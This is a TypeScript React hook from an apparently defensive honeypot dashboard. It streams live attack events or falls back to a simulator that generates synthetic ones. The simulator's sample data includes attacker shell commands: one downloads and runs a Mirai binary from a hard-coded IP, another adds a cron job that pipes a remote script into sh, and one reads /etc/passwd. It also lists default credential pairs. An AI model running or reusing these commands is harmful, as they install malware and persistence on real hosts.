import { useEffect, useRef, useState } from 'react';
import { startAttackHub } from '@/api/signalr';
import { useConnectionStore } from '@/stores/connectionStore';
import type { HoneypotEvent, HoneypotEventType, SensorType } from '@/types/api';

/**
 * Live attack stream hook.
 *
 * Tries to connect to the real SignalR hub (/hubs/attacks). When a real backend
 * is unavailable — i.e. local dev with MSW, which cannot intercept WebSockets —
 * it transparently falls back to a lightweight client-side simulator so the
 * dashboard (live feed + attack map) stays demoable without a backend.
 *
 * The simulator is intentionally self-contained (no dependency on the MSW
 * generator) so it can ship in the app bundle without pulling in mock fixtures.
 */

export interface UseLiveAttacksOptions {
  /** Maximum number of events to retain in the rolling buffer. Default 200. */
  bufferSize?: number;
  /** Whether to start the stream. Default true. */
  enabled?: boolean;
}

export interface UseLiveAttacksResult {
  /** Newest-first rolling buffer of live events. */
  events: HoneypotEvent[];
  /** The single most recent event (handy for map pulses). */
  latest: HoneypotEvent | null;
  /** True when the synthetic simulator is driving the stream (no real hub). */
  simulated: boolean;
}

const GEO_POOL = [
  { country: 'CN', countryName: 'Chiny', city: 'Szanghaj', lat: 31.23, lon: 121.47, asn: 4134, org: 'Chinanet' },
  { country: 'RU', countryName: 'Rosja', city: 'Moskwa', lat: 55.75, lon: 37.62, asn: 12389, org: 'Rostelecom' },
  { country: 'US', countryName: 'Stany Zjednoczone', city: 'Ashburn', lat: 39.04, lon: -77.49, asn: 14618, org: 'Amazon AWS' },
  { country: 'BR', countryName: 'Brazylia', city: 'São Paulo', lat: -23.55, lon: -46.63, asn: 28573, org: 'Claro S.A.' },
  { country: 'IN', countryName: 'Indie', city: 'Mumbaj', lat: 19.08, lon: 72.88, asn: 9829, org: 'BSNL' },
  { country: 'VN', countryName: 'Wietnam', city: 'Hanoi', lat: 21.03, lon: 105.85, asn: 45899, org: 'VNPT' },
  { country: 'NL', countryName: 'Holandia', city: 'Amsterdam', lat: 52.37, lon: 4.9, asn: 60781, org: 'LeaseWeb' },
  { country: 'IR', countryName: 'Iran', city: 'Teheran', lat: 35.69, lon: 51.39, asn: 197207, org: 'MCCI' },
  { country: 'DE', countryName: 'Niemcy', city: 'Frankfurt', lat: 50.11, lon: 8.68, asn: 24940, org: 'Hetzner Online' },
] as const;

const SENSOR_IDS: Record<SensorType, readonly string[]> = {
  ssh: ['hp-ssh-weu-01', 'hp-ssh-neu-02', 'hp-ssh-eus-03'],
  web: ['hp-web-weu-01', 'hp-web-sea-02'],
  rdp: ['hp-rdp-weu-01', 'hp-rdp-eus-02'],
};

const CREDS = [
  { username: 'root', password: '123456' },
  { username: 'admin', password: 'admin' },
  { username: 'pi', password: 'raspberry' },
  { username: 'root', password: 'root' },
  { username: 'ubuntu', password: 'ubuntu' },
];

const COMMANDS = [
  'wget http://185.224.128.43/bins/mirai.x86 -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x',
  'uname -a',
  'cat /etc/passwd',
  'crontab -l; echo "*/5 * * * * curl -fsSL http://193.32.162.71/c.sh | sh" | crontab -',
];

const HTTP_PATHS = [
  { method: 'GET', path: '/.env' },
  { method: 'GET', path: '/wp-login.php' },
  { method: 'POST', path: '/boaform/admin/formLogin' },
  { method: 'GET', path: '/actuator/health' },
];

const KILL_CHAIN = ['recon', 'delivery', 'exploitation', 'installation', 'c2'] as const;
const CATEGORIES = ['brute-force', 'botnet', 'cryptomining', 'web-scan', 'webshell'] as const;

let seq = 0;

function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIp(): string {
  return `${randInt(1, 223)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

/** Builds one synthetic but plausible honeypot event. */
export function synthesizeEvent(): HoneypotEvent {
  seq += 1;
  const sensorType: SensorType = pick(['ssh', 'ssh', 'ssh', 'web', 'web', 'rdp']);
  const eventTypeBySensor: Record<SensorType, readonly HoneypotEventType[]> = {
    ssh: ['login.failed', 'login.failed', 'login.success', 'command', 'connect'],
    web: ['http.request', 'http.request', 'connect'],
    rdp: ['login.failed', 'connect'],
  };
  const eventType = pick(eventTypeBySensor[sensorType]);
  const geo = pick(GEO_POOL);
  const malicious = Math.random() < 0.55;

  const event: HoneypotEvent = {
    id: `evt-live-${Date.now()}-${seq.toString(36)}`,
    attackerIp: randomIp(),
    sensorId: pick(SENSOR_IDS[sensorType]),
    sensorType,
    timestamp: new Date().toISOString(),
    eventType,
    sessionId: eventType === 'connect' ? undefined : `sess-${randInt(1000, 9999)}`,
    geo: { ...geo },
    threatIntel: {
      knownMalicious: malicious,
      sources: malicious ? ['AbuseIPDB'] : [],
      score: malicious ? randInt(60, 100) : randInt(0, 40),
    },
    classification: {
      killChainPhase: pick(KILL_CHAIN),
      category: pick(CATEGORIES),
      sophistication: (Math.random() * 0.9 + 0.05).toFixed(2),
      intent: malicious ? 'budowa botnetu' : 'rozpoznanie',
    },
  };

  if (eventType === 'login.failed' || eventType === 'login.success') {
    event.credentials = pick(CREDS);
  } else if (eventType === 'command') {
    event.command = pick(COMMANDS);
  } else if (eventType === 'http.request') {
    event.http = { ...pick(HTTP_PATHS), userAgent: 'python-requests/2.31.0' };
  }
  return event;
}

/**
 * Global event bus for attacks. Every pushed event (real hub or simulator) is
 * dispatched here so lightweight consumers — like the critical-attack toaster —
 * can react to the same stream without opening a second connection.
 */
export const attackBus = new EventTarget();
export const ATTACK_BUS_EVENT = 'attack';

// ── App-level stream manager ────────────────────────────────────────────────
// The SignalR connection is a SINGLETON for the whole app session: started once
// on first use and kept alive across route changes. Previously each page's
// useLiveAttacks started the hub on mount and stopped it on unmount, so every
// navigation tore the connection down — pages without the hook (Analytics, IoC…)
// were left "offline", and the start/stop race threw and fell back to the
// simulator ("demo mode" flapping). Now pages only subscribe to attackBus.

const SHARED_BUFFER_MAX = 500;
let sharedEvents: HoneypotEvent[] = [];
let streamStarted = false;
let simTimer: ReturnType<typeof setInterval> | undefined;

/** Adds one event to the shared buffer (dedup by id) and notifies subscribers. */
function broadcast(event: HoneypotEvent): void {
  const existing = sharedEvents.findIndex((e) => e.id === event.id);
  if (existing !== -1) {
    const merged = sharedEvents.slice();
    merged[existing] = event;
    sharedEvents = merged;
  } else {
    sharedEvents = [event, ...sharedEvents];
    if (sharedEvents.length > SHARED_BUFFER_MAX) {
      sharedEvents = sharedEvents.slice(0, SHARED_BUFFER_MAX);
    }
  }
  attackBus.dispatchEvent(new CustomEvent(ATTACK_BUS_EVENT, { detail: event }));
}

function startSimulatorOnce(): void {
  if (simTimer) return;
  const store = useConnectionStore.getState();
  store.setSimulated(true);
  store.setStatus('connected');
  // Seed a few events so the views aren't empty on first paint.
  for (let i = 0; i < 12; i += 1) broadcast(synthesizeEvent());
  simTimer = setInterval(() => {
    const burst = randInt(1, 3);
    for (let i = 0; i < burst; i += 1) broadcast(synthesizeEvent());
  }, 1500);
}

/** Idempotent: starts the live stream exactly once for the app session. */
function ensureStreamStarted(): void {
  if (streamStarted) return;
  streamStarted = true;

  if (import.meta.env.PROD) {
    // Connect to the real SignalR hub; fall back to the simulator only if the
    // hub is genuinely unreachable, so the dashboard still shows activity.
    startAttackHub(broadcast)
      .then(() => {
        if (useConnectionStore.getState().status !== 'connected') {
          startSimulatorOnce();
        } else {
          useConnectionStore.getState().setSimulated(false);
        }
      })
      .catch(() => startSimulatorOnce());
  } else {
    // Dev / tests run on MSW mocks, which cannot intercept WebSockets — drive
    // the stream deterministically with the client-side simulator.
    startSimulatorOnce();
  }
}

export function useLiveAttacks(options?: UseLiveAttacksOptions): UseLiveAttacksResult {
  const bufferSize = options?.bufferSize ?? 200;
  const enabled = options?.enabled ?? true;
  const [events, setEvents] = useState<HoneypotEvent[]>(() => sharedEvents.slice(0, bufferSize));
  const [latest, setLatest] = useState<HoneypotEvent | null>(() => sharedEvents[0] ?? null);
  const simulated = useConnectionStore((s) => s.simulated);

  const bufferRef = useRef(bufferSize);
  useEffect(() => {
    bufferRef.current = bufferSize;
  }, [bufferSize]);

  useEffect(() => {
    if (!enabled) return;
    // Start the singleton connection on first use (idempotent — it is never
    // restarted or stopped on navigation, which is what caused the demo/offline
    // flapping between tabs).
    ensureStreamStarted();
    // Seed local state from the shared buffer so a freshly-mounted page shows
    // recent events immediately instead of waiting for the next one.
    setEvents(sharedEvents.slice(0, bufferRef.current));
    setLatest(sharedEvents[0] ?? null);

    const onAttack = (e: Event) => {
      const event = (e as CustomEvent<HoneypotEvent>).detail;
      setLatest(event);
      setEvents((prev) => {
        // The same event can arrive twice (insert + classification PATCH both
        // hit the Change Feed) — replace in place instead of duplicating.
        const existing = prev.findIndex((x) => x.id === event.id);
        if (existing !== -1) {
          const merged = prev.slice();
          merged[existing] = event;
          return merged;
        }
        const next = [event, ...prev];
        return next.length > bufferRef.current ? next.slice(0, bufferRef.current) : next;
      });
    };
    attackBus.addEventListener(ATTACK_BUS_EVENT, onAttack);
    return () => attackBus.removeEventListener(ATTACK_BUS_EVENT, onAttack);
  }, [enabled]);

  return { events, latest, simulated };
}
